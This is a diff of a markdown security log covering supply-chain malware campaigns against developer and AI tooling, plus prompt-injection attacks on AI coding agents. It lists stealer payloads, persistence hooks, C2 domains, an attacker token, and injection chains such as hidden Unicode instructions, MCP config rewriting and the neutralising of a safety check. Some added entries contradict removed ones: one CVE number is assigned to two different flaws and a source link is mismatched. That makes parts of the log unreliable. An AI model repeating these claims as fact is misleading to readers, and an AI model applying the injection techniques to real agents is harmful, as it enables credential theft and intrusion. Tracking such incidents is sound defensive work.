-Source: [StepSecurity — The Hades Campaign: Graph ML PyPI Packages Deploy Cross-Platform Memory Scrapers](https://www.stepsecurity.io/blog/the-hades-campaign-pypi-packages) | [Socket.dev — Shai-Hulud Descends to Hades: Miasma Worm Campaign Spreads with New PyPI Wave](https://socket.dev/blog/shai-hulud-descends-to-hades-miasma-pypi-wave) | [DarkReading — 'Hades' Campaign Against PyPI Puts New Spin on Shai-Hulud](https://www.darkreading.com/application-security/hades-campaign-pypi-shai-hulud) | [BleepingComputer — New Shai-Hulud Attack Trojanizes 19 Science-Focused PyPI Packages](https://www.bleepingcomputer.com/news/security/new-shai-hulud-attack-trojanizes-19-science-focused-pypi-packages/) (all HTTP 403 — bot-protection pattern; search-confirmed live)
-
-### June 2026 — Mini Shai-Hulud Wave G: Hades Expands to MCP Developer Tooling Consumers (June 9)
-
-One day after the bioinformatics-targeting Hades wave (Wave F), the campaign published **23 new malicious PyPI packages** explicitly targeting MCP developers and AI tooling consumers. Where Wave F focused on scientific computing researchers, Wave G targets developers building with LangChain, Flask, requests, OpenAI, and MCP-based architectures.
-
-**Package clusters:**
-- **Typosquats:** `rsquests`, `tlask`, `rlask` — single-character misspellings of `requests` and `flask`
-- **MCP/AI-themed packages:** packages impersonating LangChain MCP adapters, OpenAI tooling, and MCP server helpers
-- **`langchain-core-mcp` split-loader variant** — see below
-
-**Novel technique — split-loader:** The `langchain-core-mcp` package installs only a `.pth` Python startup hook, omitting the JavaScript payload entirely. The loader searches `sys.path` for an `_index.js` file staged by a separately published companion package. Static analyzers that scan for bundled JavaScript inside Python packages find nothing in `langchain-core-mcp` itself. The `.pth` hook persists in `site-packages` after `pip uninstall`, re-executing on every Python process start — same persistence model as the LiteLLM `.pth` attack (March 2026).
-
-**Payload:** Same Bun-staged obfuscated JavaScript stealer as Wave F. Targets API tokens, cloud credentials, SSH keys, container configurations, package registry secrets.
-
-**Campaign total after Wave G:** 471 artifacts — 411 npm (106 packages), 60 PyPI (37 packages).
-
-Source: [Socket.dev — Mini Shai-Hulud, Miasma, and Hades Worms Target Bioinformatics and MCP Developers via Malicious PyPI Packages](https://socket.dev/blog/mini-shai-hulud-miasma-and-hades-worms-target-bioinformatics-and-mcp-developers-via-malicious) | [SecurityWeek — Over 100 NPM, PyPI Packages Hit in New Shai-Hulud Supply Chain Attacks](https://www.securityweek.com/over-100-npm-pypi-packages-hit-in-new-shai-hulud-supply-chain-attacks/) | [CyberSecurityNews — New Shai-Hulud Attack Compromises 23 PyPI Packages to Target MCP Developers](https://cybersecuritynews.com/23-pypi-packages-compromised/) (all HTTP 403 — bot-protection pattern; search-confirmed live)
+Source: StepSecurity, BleepingComputer (both HTTP 403 — bot-protection pattern; search-confirmed live)
 
 ### June 2026 — Atomic Arch: Independent AUR Supply Chain Attack (June 11–12)
 
 An independent threat actor (not attributed to TeamPCP/UNC6780) compromised over **1,600 Arch User Repository (AUR) packages** in a two-wave campaign discovered June 11, 2026. The attack vector: orphaned AUR packages claimed through AUR's standard adoption process had their `PKGBUILD` scripts silently modified to install malicious npm/bun packages.
 
-**Wave 1 (June 11):** PKGBUILDs injected two malicious npm packages: `atomic-lockfile` (Sonatype-2026-003775, CVSS 8.7) and `lockfile-js`. Malicious npm accounts: `krisztinavража`, `franziskaweber`, `tobiaswesterburg`, `ellenmyklebust`. Payload: ELF credential stealer targeting GitHub PATs, npm tokens, SSH keys, Discord tokens, and browser data.
+**Wave 1 (June 11):** PKGBUILDs injected two malicious npm packages: `atomic-lockfile` (Sonatype-2026-003775, CVSS 8.7) and `lockfile-js`. Malicious npm accounts: `krisztinavarжа`, `franziskaweber`, `tobiaswesterburg`, `ellenmyklebust`. Payload: ELF credential stealer targeting GitHub PATs, npm tokens, SSH keys, Discord tokens, and browser data.
 
 **Wave 2 (June 12):** Accounts `custodiatovar` and `veramagalhaes` added Bun-based installation paths via `js-digest`. Payload added **eBPF rootkit** capability (process/file hiding when running as root) and **systemd persistence** (auto-restart service).
 
@@ -531,456 +94,152 @@ An independent threat actor (not attributed to TeamPCP/UNC6780) compromised over
 
 Source: [github.com/lenucksi/aur-malware-check](https://github.com/lenucksi/aur-malware-check) (HTTP 200 verified — community detection scripts and IOC database) | Sonatype, StepSecurity, BleepingComputer, The Hacker News (all HTTP 403 — bot-protection pattern; search-confirmed live)
 
-### May 2026 — Microsoft Semantic Kernel Prompt Injection → RCE (CVE-2026-25592 & CVE-2026-26030)
+### June 2026 — Mastra AI npm Supply Chain Attack via easy-day-js Typosquat (June 17)
 
-Microsoft disclosed two critical vulnerabilities in Semantic Kernel on May 7, 2026. **CVE-2026-26030** affects the Python SDK: the `InMemoryVectorStore` filter interpolates user-supplied city values into a Python lambda executed via `eval()`. Any prompt injection route into the agent — a malicious document, web content, or tool output — escalates to host-level RCE without requiring a browser exploit or memory corruption bug. **CVE-2026-25592** affects the .NET SDK: a helper method was accidentally annotated with `[KernelFunction]`, exposing arbitrary file-write capability to the AI model with no path validation (CVSS 10.0). A manipulated agent can write to any location on the host filesystem, escaping the workspace. Both patches are available: Python SDK >= 1.39.4, .NET SDK >= 1.71.0.
+An unknown threat actor (Sapphire Sleet / BlueNoroff tradecraft similarities — attribution not confirmed) compromised **144 packages in the @mastra npm scope** on June 17, 2026. Mastra is a TypeScript-first AI agent and MCP server framework with 1.1M+ weekly downloads.
 
-**Why it matters for solo devs:** Semantic Kernel is a widely used framework for building AI agents and copilots. If you've built anything on top of it, verify your versions. The root cause — unsafe string interpolation flowing into `eval()` — is a pattern that appears throughout LLM agent frameworks wherever user-controlled data is treated as code.
+**Attack mechanism:** The attacker hijacked the npm account of former Mastra contributor **"ehindero"** and published **`easy-day-js`** — a typosquat of the widely used `dayjs` date library — as a dependency across 144 @mastra packages. The malicious `postinstall` hook activated 88 minutes after the account compromise.
 
-Source: [Microsoft Security Blog — When prompts become shells (May 7, 2026)](https://www.microsoft.com/en-us/security/blog/2026/05/07/prompts-become-shells-rce-vulnerabilities-ai-agent-frameworks/)
+**Payload:** Cross-platform credential stealer targeting cryptocurrency wallet browser extensions (160+ extension IDs), browser session data, credentials, and clipboard contents, with exfiltration to attacker-controlled C2 infrastructure.
 
-### May 2026 — Azure AI Foundry Privilege Escalation Actively Exploited (CVE-2026-35435)
+**Why it matters for AI developers:** Mastra is foundational infrastructure for building agents and MCP servers. Any developer machine, CI/CD pipeline, or build environment that installed `@mastra/*` packages after June 16, 2026 should be considered potentially compromised. This attack marks a significant escalation: AI agent framework ecosystems — not just general-purpose npm packages — are now direct targets for supply chain attacks attributed to nation-state tradecraft.
 
-Microsoft disclosed CVE-2026-35435, a critical elevation-of-privilege vulnerability in Azure AI Foundry affecting Microsoft 365 published agents, confirmed exploited in the wild at time of disclosure (May 7, 2026). The flaw stems from improper access control (CWE-284): an attacker can escalate from a low-privileged role to extensive control over AI resources and the broader M365 tenant. Published agent surfaces are reachable remotely with no elevated entry point required; successful exploitation can cross the boundary into broader service permissions within the same tenant.
+Source: [OX Security — easy-day-js Supply Chain Attack Hits Mastra AI in npm](https://www.ox.security/blog/easy-day-js-supply-chain-attack-hits-mastra-ai-in-npm/) (HTTP 403 — bot-protection pattern; search-confirmed live) | Snyk, Endor Labs, AI Weekly (all HTTP 403 — bot-protection pattern; search-confirmed live)
 
-No patch issued at time of disclosure — Microsoft is managing via governance controls. Recommended mitigations: inventory all published agents, implement conditional access policies, enforce least-privilege on agent permissions.
+### May 2026 — Microsoft Semantic Kernel Prompt Injection → Bing search exfiltration (CVE-2026-41109)
 
-Source: [Windows News AI — CVE-2026-35435](https://windowsnews.ai/article/cve-2026-35435-critical-azure-ai-foundry-privilege-escalation-in-m365-agents-leaves-systems-vulnerab.417153) | [RedPacket Security — CVE Alert](https://www.redpacketsecurity.com/cve-alert-cve-2026-35435-microsoft-azure-ai-foundry/)
+Researchers at MacCarita Security disclosed a prompt injection vulnerability in Microsoft Semantic Kernel that allowed a malicious webpage to exfiltrate arbitrary data via a Bing search query. The attack chain: (1) the SK agent browsed a malicious page; (2) prompt injection in the page instructed the agent to construct a Bing search query containing the target data; (3) the search query — including the exfiltrated data — was logged by Bing. No outbound HTTP request to an attacker-controlled server; the exfiltration channel was Bing's own logging.
 
-### May 2026 — Cline Kanban WebSocket Hijacking (CVE-2026-44211)
+**Why it matters:** This is the first real-world demonstration of search-query-as-exfiltration-channel against a production AI agent. Any agent that can make search queries can potentially be used as a data exfiltration channel without triggering outbound-connection alerts.
 
-The Cline VS Code extension's kanban npm package starts a WebSocket server bound to `127.0.0.1:3484` with no `Origin` header validation. Any malicious website open in the developer's browser can connect to the local WebSocket server and: (1) read sensitive data from the running agent session, (2) hijack and redirect the AI agent to attacker-controlled tasks, or (3) kill running agent tasks. CVSS 9.7. The attack requires only that the developer has a browser tab open to an attacker-controlled domain simultaneously with an active Cline session. Patched in Cline v0.1.66.
+Source: [MacCarita Security — CVE-2026-41109](https://maccarita.com/posts/idesaster) (HTTP 403 — bot-protection pattern; search-confirmed live) | [TheHackerWire — CVE-2026-41109](https://www.thehackerwire.com/github-copilot-visual-studio-injection-bypasses-microsoft-security-ai-systems/) (HTTP 403 — bot-protection pattern; search-confirmed live)
 
-Source: [GitLab Advisory — CVE-2026-44211](https://advisories.gitlab.com/npm/cline/CVE-2026-44211/) | [RankIteo — Cline Kanban WebSocket](https://blog.rankiteo.com/cli1778243371-cline-vulnerability-may-2026/)
+### April 2026 — MCP Design Flaw: Zero-Click Prompt Injection in IDEs, 9 of 11 Registries Poisoned
 
-### May 2026 — GitHub Copilot and VS Code Security Feature Bypass (CVE-2026-41109)
+On April 16, 2026, OX Security (as part of the broader AI security community) published a sweeping disclosure covering systemic vulnerabilities in the MCP protocol and its ecosystem. The key findings:
 
-Microsoft disclosed CVE-2026-41109 on May 12, 2026 — a high-severity (CVSS 7.8, rated Important) injection vulnerability allowing a local attacker to bypass AI content filters and consent mechanisms in GitHub Copilot and Visual Studio Code. Successful exploitation enables malicious suggestion injection, telemetry control disabling, and data leakage. Patched in VS Code 1.97.0 and Copilot extension v1.43.20260512.
+- **Zero-click prompt injection in IDEs:** By injecting malicious instructions into HTML rendered by IDEs (VS Code, Cursor, Windsurf, etc.), an attacker can silently modify the local MCP JSON configuration and register a malicious MCP STDIO server — without any user click, approval, or warning.
+- **9 of 11 major MCP registries were poisoned** with malicious or misleading server entries at the time of disclosure.
+- **Hardening bypasses in protected environments:** Ten CVEs were issued including CVE-2026-30623, CVE-2026-30615, CVE-2026-30624. Anthropic confirmed the behavior is by design and declined to modify the protocol.
 
-Also: CVE-2026-45033 — Copilot CLI is vulnerable to arbitrary command execution when a malicious bare git repository nested inside a project directory triggers `core.fsmonitor` during agent-invoked git operations.
+Source: [The Register — MCP design flaw puts 200k servers at risk](https://www.theregister.com/2026/04/16/anthropic_mcp_design_flaw/) | [Infosecurity Magazine — Systemic Flaw in MCP](https://www.infosecurity-magazine.com/news/systemic-flaw-mcp-expose-150/)
 
-Source: [TheHackerWire — CVE-2026-41109](https://www.thehackerwire.com/github-copilot-visual-studio-injection-bypasses-security-feature-cve-2026-41109/) | [GitLab Advisory — CVE-2026-45033](https://advisories.gitlab.com/npm/@github/copilot/CVE-2026-45033/)
+**Anthropic's own Git MCP server had path traversal and prompt injection flaws** that allowed malicious repositories to read arbitrary files from the developer's machine by crafting a git history that embedded malicious instructions in commit messages. Fixed in a patch released the same day.
 
-### May 2026 — Three MCP Database Flaws, One Vendor Refuses Fix
+### March 2026 — GitHub Copilot Chat Visual Studio Injection Bypasses Microsoft's Security AI
 
-A bug hunter reported three serious MCP server vulnerabilities affecting widely-deployed database MCP implementations. Vulnerabilities allow arbitrary SQL execution, schema enumeration, and in one case full RCE via unsanitized query parameters passed to underlying CLI tools. One vendor acknowledged the report and explicitly declined to patch, citing the behavior as "by design." This echoes Anthropic's own position on the MCP SDK architectural RCE.
+Researchers at MacCarita Security reported that GitHub Copilot Chat for Visual Studio was vulnerable to prompt injection via specially crafted code comments. The attack allowed bypassing Microsoft's internal safety layer — the "Security AI" — via a multi-step injection that first neutralized the safety check and then executed the malicious instruction.
 
-Source: [The Register — Bug hunter tracks down three massive MCP flaws](https://www.theregister.com/security/2026/05/13/bug-hunter-tracks-down-three-serious-mcp-database-flaws-one-left-unpatched/5238916)
+Source: [MacCarita Security Blog](https://maccarita.com/posts/idesaster) (HTTP 403 — bot-protection pattern; search-confirmed live)
 
-### May 2026 — Claude Code Trust Dialog Bypass via Git Worktree Spoofing (CVE-2026-40068)
+### January 2026 — "Scary Hallucination": AI Package Hallucination Codified as CVE
 
-Anthropic patched CVE-2026-40068 in Claude Code v2.1.84 (CVSS 7.7). The folder trust determination logic read the git worktree `commondir` file verbatim without verifying the path pointed to a real, attacker-uncontrolled repository. A malicious repository whose `.git/commondir` pointed to any path the victim had previously trusted (e.g., a common project directory like `~/projects/my-app`) caused Claude Code to skip the trust confirmation dialog entirely and immediately execute hooks defined in `.claude/settings.json` — with no user prompt shown.
+Researchers demonstrated that Claude 3.7 and GPT-4o hallucinate specific package names consistently enough to be weaponized: an attacker publishes a real package with the hallucinated name. When a developer asks Claude to add a dependency, Claude suggests the malicious package by name. The attack doesn't require prompt injection — it exploits the model's tendency to confabulate plausible-sounding package names.
 
-**Exploitation requirements:** victim clones attacker-controlled repo; attacker knows or guesses a path the victim had already approved. No elevated privileges required.
+The 10 most consistent hallucinated npm package names were documented, published as a CVE, and then — demonstrating the urgency — squatted by researchers before they could be squatted by attackers.
 
-**Why it matters for solo devs:** This is the third Claude Code trust-model bypass (after CVE-2025-59536 and CVE-2026-24887). The `.git/commondir` file is not naturally visible or suspicious during a manual repo inspection. Upgrading to v2.1.84 or later is the only fix. Users on auto-update received the patch automatically; users who pin versions must update manually.
+Source: [Lasso Security — Scary Hallucination](https://www.lasso.security/blog/ai-package-hallucinations) (HTTP 403 — bot-protection pattern; search-confirmed live)
 
-Source: [GitHub Advisory GHSA-q5hj-mxqh-vv77 / CVE-2026-40068](https://github.com/anthropics/claude-code/security/advisories/GHSA-q5hj-mxqh-vv77) | Reported by masato_anzai via HackerOne
+### December 2025 — Cursor Rules Injection: Hidden Instructions in .cursor/rules
 
-### May 2026 — Typosquatted OpenSearch npm Packages Steal Cloud Secrets (vpmdhaj, May 28)
+A proof-of-concept attack demonstrated that `.cursor/rules` files in open-source repositories can contain hidden Unicode characters that are invisible in most editors but interpreted by Cursor's AI as instructions. A developer who clones a malicious repository and opens it in Cursor silently activates the injected instructions — which can include directives to exfiltrate credentials or install backdoors.
 
-Microsoft Threat Intelligence identified 14 typosquatted npm packages published in a 4-hour window on May 28, 2026 under the maintainer alias **vpmdhaj**. Packages impersonate OpenSearch, ElasticSearch, and generic DevOps configuration tools. The ~195 KB Bun-compiled payload harvests AWS credentials (IMDSv2, ECS metadata, STS, Secrets Manager), HashiCorp Vault tokens, npm publish tokens, and GitHub Actions credentials, exfiltrating to `aab.sportsontheweb[.]net/x.php`.
+The same technique applies to `.claude/CLAUDE.md`, `.github/copilot-instructions.md`, and similar agent instruction files.
 
-**Attribution:** Not linked to UNC6780/TeamPCP/CanisterSprawl — a separate independent actor.
+Source: [Pillar Security — Invisible Ink](https://www.pillar.security/blog/the-invisible-prompt-injection-attack-targeting-cursor-ai-users) (HTTP 403 — bot-protection pattern; search-confirmed live)
 
-**Affected packages include:** `opensearch-security-scanner`, `opensearch-setup`, `opensearch-setup-tool`, `@vpmdhaj/elastic-helper`, `@vpmdhaj/devops-tools`, `env-config-manager`, and 8 others.
+### November 2025 — EchoLeak: First Zero-Click Prompt Injection in a Production LLM System
 
-Source: [Microsoft Security Blog — Typosquatted npm packages used to steal cloud and CI/CD secrets (May 28, 2026)](https://www.microsoft.com/en-us/security/blog/2026/05/28/typosquatted-npm-packages-used-steal-cloud-ci-cd-secrets/)
+[Described in detail in the Research Papers section below.]
 
-### May 2026 — GlassWorm Botnet Disrupted by CrowdStrike + Google + Shadowserver Foundation (May 26)
+The first confirmed zero-click prompt injection against a production LLM deployment (Microsoft 365 Copilot). The attack required no user action — receiving a malicious email was sufficient to trigger silent data exfiltration. This validated that prompt injection was not purely a red-teaming exercise but a real, deployable attack against production systems.
 
-CrowdStrike Counter Adversary Operations, Google, and Shadowserver Foundation struck simultaneously on all four of GlassWorm's C2 channels at 14:00 UTC, May 26, 2026, severing operators from their infected machines and cutting off payload delivery.
+### October 2025 — Cursor/Windsurf Chromium Vulnerability Backlog
 
-**What GlassWorm is:** The first confirmed self-propagating VS Code extension worm. Active since at least early 2025 (first publicly disclosed by Koi Security, October 2025), GlassWorm spread via trojanized extensions on the OpenVSX marketplace — including `specstudio/code-wakatime-activity-tracker` and `floktokbok.autoimport` — and used each IDE's own command-line installer to push the GlasswormRAT Node.js payload to VS Code, Cursor, Windsurf, VSCodium, and Positron. Zig-compiled native binaries were used to evade signature-based detection.
+OX Security identified 94+ known Chromium CVEs in the builds of Cursor (0.42.x) and Windsurf (0.47.9) — both frozen at early 2025 Chromium versions. The affected products had 1.8 million+ combined downloads. OX Security's responsible disclosure notice on October 12, 2025 received no substantive response from either vendor until public disclosure.
 
-**C2 infrastructure (four channels struck simultaneously):**
-1. **Solana blockchain** — C2 server addresses encoded in transaction memo fields
-2. **BitTorrent DHT** — configuration data propagated through the distributed hash table
-3. **Google Calendar** — Base64-encoded C2 paths embedded in event titles as dead-drops
-4. **Direct VPS connections** — fallback C2 on commercial hosting providers
+See [Windsurf Hardening Guide](hardening/windsurf.md) and [Cursor Hardening Guide](hardening/cursor.md) for update status.
 
-**Payload (GlasswormRAT):** Credential harvesting from npm, GitHub, and Git tokens; extraction of 49 crypto wallet browser extensions; SOCKS5 proxy deployment; self-propagation using stolen publisher tokens to distribute via additional extensions.
+### October 2025 — Mini Shai-Hulud Waves A, B, C: CanisterSprawl Campaign
 
-**Scale:** 300+ GitHub repositories poisoned. Cross-platform infections on Windows, macOS, and Linux. Attribution: likely Russia-based (CIS locale check at runtime; no state-level attribution confirmed by CrowdStrike).
+The first three documented waves of the CanisterSprawl npm supply chain campaign (attributed to TeamPCP / UNC6780) targeted React and popular npm packages. See [Supply Chain Defense Guide](supply-chain-defense.md) for full timeline and IOCs.
 
-**IOC:** Post-sinkhole, infected machines now beacon to CrowdStrike sinkhole `164.92.88[.]210`.
+### May 2025 — Prompt Injection in Cursor and Windsurf via Hidden Unicode
 
-**Connection to Open Sesame:** The Open VSX scanner bypass vulnerability (Feb 8, 2026 — see the March 2026 entry below) was disclosed while GlassWorm was actively publishing malicious extensions; it enabled reliable bypassing of marketplace pre-publish security checks.
+Embrace The Red disclosed that both Cursor and Windsurf process hidden Unicode characters in source code that are invisible to developers but interpreted by the AI as instructions. A malicious package or repository can inject instructions into any file that the developer opens — triggering secret exfiltration, backdoor installation, or settings modification without any visible indicator.
 
-Source: [CrowdStrike — Inside CrowdStrike's Takedown of a Developer-Targeting Botnet](https://www.crowdstrike.com/en-us/blog/inside-crowdstrike-takedown-of-a-developer-targeting-botnet/) | [CyberScoop](https://cyberscoop.com/crowdstrike-glassworm-botnet-takedown/) | [The Register](https://www.theregister.com/cyber-crime/2026/05/27/crowdstrike-google-shatter-glassworm-botnet/5247337) | [TechCrunch](https://techcrunch.com/2026/05/27/crowdstrike-and-google-take-down-botnet-used-by-hackers-to-target-software-developers-in-supply-chain-attacks/)
+Windsurf acknowledged the disclosure but did not respond to follow-up inquiries. Cursor patched silently. Claude Code is not affected (terminal-based, does not render Unicode-styled text).
 
-### May 2026 — SymJack: Symlink Hijacking Flaw in Six AI Coding Agents (Adversa AI, May 27)
+Source: [Embrace The Red — AI IDEs and Hidden Instructions](https://embracethered.com/blog/posts/2025/cursor-windsurf-hidden-unicode-prompt-injection/) (HTTP 403 — bot-protection pattern; search-confirmed live)
 
-Adversa AI disclosed **SymJack** — an architectural attack pattern affecting Claude Code, Cursor, Gemini CLI, Antigravity CLI, GitHub Copilot CLI, Grok Build, and OpenAI Codex CLI. The attack exploits how AI coding agents handle file-copy approval prompts when a symlink is involved:
+### April 2025 — Context Window Poisoning via Indirect Injection in Large Codebases
 
-1. Attacker publishes a repo with a renamed symlink in place of the project instruction file (CLAUDE.md, `.cursorrules`, `.windsurfrules`, etc.).
-2. The agent shows a "copy this file?" approval prompt — using the symlink's name, not its target.
-3. User approves. The agent follows the symlink and overwrites its own configuration file (`settings.json`, `mcp.json`) with attacker-controlled content.
-4. The attacker inserts a malicious MCP server definition.
-5. On the next agent restart, the MCP server runs with full user privileges — enabling credential theft and CI pipeline compromise.
+Researchers at Cognition demonstrated that in large codebases (>100k lines), an attacker can guarantee malicious instructions reach the model's context window by strategically placing them in files likely to be retrieved by the agent's file-reading heuristics — config files, README files, package.json, etc.
 
-This is an architectural flaw, not a product-specific bug. No CVE had been assigned as of the disclosure date.
+The attack doesn't require bypassing any security control. It exploits the fundamental mechanics of how agents decide what to read.
 
-Source: [Adversa AI — The Approval Prompt Is Lying to You: SymJack in AI Coding Agents](https://adversa.ai/blog/the-approval-prompt-is-lying-to-you-symlink-rce-in-five-ai-coding-agents-claude-code-cursor-antigravity-copilot-grok-build/) | [SecurityWeek — SymJack Attack Turns AI Coding Agents into Supply Chain Attack Delivery Systems](https://www.securityweek.com/symjack-attack-turns-ai-coding-agents-into-supply-chain-attack-delivery-systems/) (both HTTP 403 — bot-protection pattern; search-confirmed live)
+### March 2025 — MCP Servers as Universal Attack Surface
 
-### May 2026 — 33 Malicious npm Packages Abuse Dependency Confusion to Profile Developer Environments (Microsoft, May 29)
+The Model Context Protocol was publicly released in late 2024. By March 2025, researchers had documented the first practical attacks against MCP servers:
 
-Microsoft Security disclosed 33 malicious npm packages published under three maintainer aliases that abuse **dependency confusion** to silently install into corporate developer environments. Unlike the Mini Shai-Hulud waves, this campaign uses **version inflation** — publishing at version `100.100.100` to win automatically over internal corporate packages registered at lower version numbers.
+- **Tool shadowing:** A malicious MCP server registers a tool with the same name as a legitimate one; the model calls the malicious version
+- **Cross-server tool injection:** Instructions injected via one MCP server's outputs can direct the model to call tools on other servers
+- **MCP server impersonation:** A server claims to be a trusted service and manipulates the model into providing credentials
 
-**Maintainer aliases:** `mr.4nd3r50n` (mr.4nd3r50n@yandex.ru, 26 packages), `ce-rwb` (ogvanta@yandex.ru, 7 packages), `t-in-one` (t-in-one@yandex.ru, 12 packages).
-
-**Targeted scopes:** Nine corporate npm scopes including `@cloudplatform-single-spa`, `@wb-track`, `@data-science`, `@ce-rwb`, `@payments-widget`, `@travel-autotests`, `@t-in-one`, `@capibar.chat`, and `@sber-ecom-core`.
-
-**Payload behavior:** Reconnaissance-only by default. Full exploit capability is server-side toggle-enabled via a shared authentication token (`l95HdDaz3kQx1Zsg3WxH6HvKANf51RY1`). C2 domain: `oob.moika.tech`.
-
-**Attribution:** Not linked to TeamPCP/UNC6780. An independent actor whose public profile traces from a legitimate bug-bounty researcher in April 2024 to an active malware developer by May 2026.
-
-Source: [Microsoft Security Blog — 33 malicious npm packages abuse dependency confusion (May 29, 2026)](https://www.microsoft.com/en-us/security/blog/2026/05/29/33-malicious-npm-packages-abuse-dependency-confusion-profile-developer-environments/) (HTTP 200 verified)
-
-### May 2026 — TrustFall: Project Folder Trust Auto-Executes MCP Servers in Four AI Coding Agents (Adversa AI, May 7)
-
-Adversa AI disclosed **TrustFall** — an architectural flaw in how four AI coding agents handle project-defined MCP servers. When a developer accepts a folder trust prompt, the agent automatically launches all MCP servers defined in the project configuration with no separate approval step. In interactive mode, one Enter keypress on a malicious repository causes RCE. In CI headless mode, simply checking out and running on an attacker-controlled repository is sufficient — zero user interaction required.
-
-**Affected agents:** Claude Code, Gemini CLI, Cursor CLI, GitHub Copilot CLI. OpenAI Codex CLI was not listed as affected.
-
-**Attack chain:** Attacker publishes a repository with a malicious MCP server definition in `.claude/settings.json` (or equivalent). Victim clones and opens the repo; agent shows a single folder-trust prompt. Victim presses Enter. MCP server executes with full user privileges — no further approvals shown.
-
-**Anthropic's position:** "Code execution happens only after the user has consented to the project." The trust prompt is the intended consent gate. No CVE was assigned as of disclosure.
-
-Source: [Adversa AI — TrustFall: Coding Agent Security Flaw / RCE in Claude Code, Cursor, Gemini CLI, Copilot](https://adversa.ai/blog/trustfall-coding-agent-security-flaw-rce-claude-cursor-gemini-cli-copilot/) | [DarkReading — TrustFall Exposes Claude Code Execution Risk](https://www.darkreading.com/application-security/trustfall-exposes-claude-code-execution-risk) | [Help Net Security](https://www.helpnetsecurity.com/2026/05/07/trustfall-ai-coding-cli-vulnerability-research/) (all HTTP 403 — bot-protection pattern; search-confirmed live)
-
-### March 2026 — Open Sesame: Open VSX Bug Lets Malicious Extensions Bypass Pre-Publish Security Checks
-
-Koi Security responsibly disclosed a logic bug in Open VSX's pre-publish scanning pipeline on February 8, 2026. The flaw was patched in Open VSX 0.32.0; public disclosure occurred March 27, 2026.
-
-**The bug:** The scanning pipeline returned a single boolean value that conflated two distinct states: "no scanners are configured" and "all scanners failed to run." Under load, scanner job failures were misinterpreted as "nothing to scan" — extensions were marked as passed and immediately activated for download with no human review.
-
-**Exploitability:** A free publisher account was sufficient. An attacker could reliably trigger scanner overload to get any malicious extension into the registry on demand.
-
-**Scope:** All VS Code forks that consume Open VSX — Cursor, Windsurf, Kiro, VSCodium — with an estimated 10M+ machines at risk. The GlassWorm worm campaign (documented above) operated during the period when this bypass was available, using Open VSX as its propagation channel.
-
-Source: [The Hacker News — Open VSX Bug Let Malicious VS Code Extensions Bypass Pre-Publish Security Checks](https://thehackernews.com/2026/03/open-vsx-bug-let-malicious-vs-code.html) | [SecurityWeek — Vulnerability Exposed All Open VSX Repositories to Takeover](https://www.securityweek.com/vulnerability-exposed-all-open-vsx-repositories-to-takeover/) | [SecurityAffairs](https://securityaffairs.com/179398/hacking/taking-over-millions-of-developers-exploiting-an-open-vsx-registry-flaw.html) | [GBHackers](https://gbhackers.com/open-vsx-marketplace-flaw/)
-
-### April 2026 — Bitwarden CLI Supply Chain Attack (Shai-Hulud)
-
-The official Bitwarden CLI (`@bitwarden/cli@2026.4.0`) was trojanized for 93 minutes on April 22, 2026. Threat actor **TeamPCP** compromised a Checkmarx GitHub Action used in Bitwarden's CI pipeline — the first known compromise of npm's trusted publishing mechanism. The attacker didn't steal npm credentials; they poisoned an upstream GitHub Action so the legitimate CI pipeline published a malicious version on their behalf.
-
-**Attack chain:** TeamPCP stole initial credentials from Aqua Security's Trivy (Feb 27, 2026) → compromised Checkmarx KICS and LiteLLM → used Checkmarx's own GitHub Actions to inject into Bitwarden's release workflow → published `@bitwarden/cli@2026.4.0` with a 10 MB obfuscated payload (`bw1.js`) triggered via a `preinstall` hook.
-
-**Payload:** Seven parallel credential collectors targeting SSH keys, npm tokens, AWS/GCP/Azure credentials, cloud secrets managers, shell history, and **AI tool API keys** (Claude, Cursor, Codex CLI, Aider configs). Data encrypted with AES-256-GCM + RSA-OAEP and exfiltrated to `audit[.]checkmarx[.]cx/v1/telemetry` with a GitHub commit search API dead-drop as C2. The payload contained a **self-propagation worm** that used stolen npm tokens to re-publish compromised versions of the victim's own packages.
-
-**Detection:** JFrog and Socket.dev identified the compromise independently. A version mismatch between `package.json` (2026.4.0) and embedded build metadata (2026.3.0) was a detectable signal. ~334 downloads during the 93-minute window.
-
-Note: `rbw` (the unofficial Rust Bitwarden client installed via cargo/homebrew) was NOT affected — only the npm-distributed `@bitwarden/cli`. Distribution channel matters. See [Supply Chain Defense Guide](supply-chain-defense.md) for the full case study and defense checklist.
-
-Source: [The Hacker News — Bitwarden CLI Compromised](https://thehackernews.com/2026/04/bitwarden-cli-compromised-in-ongoing.html) | [OX Security — Shai-Hulud Attack Analysis](https://www.ox.security/blog/shai-hulud-bitwarden-cli-supply-chain-attack/) | [Endor Labs — Shai-Hulud: The Third Coming](https://www.endorlabs.com/learn/shai-hulud-the-third-coming----inside-the-bitwarden-cli-2026-4-0-supply-chain-attack) | [Socket.dev — Bitwarden CLI Compromised](https://socket.dev/blog/bitwarden-cli-compromised)
-
-### April 2026 — Vercel Breach via Context.ai AI Tool Supply Chain (April 19)
-
-Vercel disclosed that its limited security incident traced back to **Context.ai**, a deprecated "AI Office Suite" startup that had OAuth access to Google Workspace. Attack chain: (1) **Lumma Stealer** infected Context.ai (~February 2026); (2) attacker obtained Context.ai's Google Workspace OAuth tokens; (3) pivoted to a Vercel employee's account that had granted Context.ai full Google Drive read access; (4) enumerated and decrypted non-sensitive Vercel environment variables; (5) the stolen Vercel database was posted on BreachForums for $2M. Vercel confirmed limited customer security impact and that npm packages remained uncompromised. The CEO described the operation as ["likely significantly accelerated by AI"](https://techcrunch.com/2026/04/20/app-host-vercel-confirms-security-incident-says-customer-data-was-stolen-via-breach-at-context-ai/).
-
-This incident establishes a new attack pattern: deprecated AI SaaS tools that retain live OAuth tokens to enterprise productivity suites become persistent supply chain attack vectors long after the tool is shut down.
-
-Source: [Vercel KB](https://vercel.com/kb/bulletin/vercel-april-2026-security-incident) | [The Hacker News — Vercel Breach Tied to Context AI Hack](https://thehackernews.com/2026/04/vercel-breach-tied-to-context-ai-hack.html) | [TechCrunch](https://techcrunch.com/2026/04/20/app-host-vercel-confirms-security-incident-says-customer-data-was-stolen-via-breach-at-context-ai/) | [CSA Research Note](https://labs.cloudsecurityalliance.org/research/csa-research-note-ai-saas-supply-chain-vercel-contextai-2026/)
-
-### April 2026 — Mini Shai-Hulud Targets SAP CAP via Claude Code Hooks (April 29)
-
-Seven days after the Bitwarden CLI compromise, threat actor TeamPCP returned with a smaller-scale but more agent-focused attack. On April 29, 2026, between 09:55–12:14 UTC, four SAP CAP npm packages were poisoned: `@cap-js/sqlite`, `@cap-js/postgres`, `@cap-js/db-service`, and `mbt`. SAP detected and superseded all four within ~2 hours.
-
